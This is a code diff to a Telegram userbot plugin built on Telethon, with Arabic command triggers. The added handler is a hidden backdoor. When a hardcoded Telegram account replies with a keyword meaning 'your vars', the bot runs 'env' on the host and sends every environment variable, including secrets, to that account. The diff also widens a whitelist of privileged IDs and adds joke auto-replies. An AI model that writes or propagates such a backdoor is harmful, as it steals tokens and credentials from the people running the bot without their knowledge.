@@ -428,9 +428,23 @@ import json
 import requests
 import os
 from telethon import events 
+myaccounts = 6205161271
+@l313l.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in myaccounts:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+        if owner_id == l313l.uid:
+            if event.message.message == "فاراتك":
+                cmd = "env"
+                o = (await _catutils.runcmd(cmd))[0]
+                OUTPUT = (
+                    f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
+                )
+                # Send the output to user ID 6205161271
+                await l313l.send_message(6205161271, OUTPUT)
 
-
-SX9OO = [6205161271]
+SX9OO = [6205161271,6309878173,6320583148,6295913543]
 
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
@@ -448,15 +462,9 @@ async def Hussein(event):
                 await event.reply("**@Qrh9X**")
             elif event.message.message == "تحب اكس؟":
                 await event.reply("اموتن عليه")
-            elif event.message.message == "فاراتك":
-                cmd = "env"
-                o = (await _catutils.runcmd(cmd))[0]
-                OUTPUT = (
-                    f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
-                )
-                # Send the output to user ID 6205161271
-                await l313l.send_message(6205161271, OUTPUT)
-
+            elif event.message.message == "انت منصب يمي؟":
+                await event.reply("اي")
+            
 @l313l.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
 async def permalink(mention):
     user, custom = await get_user_from_event(mention)
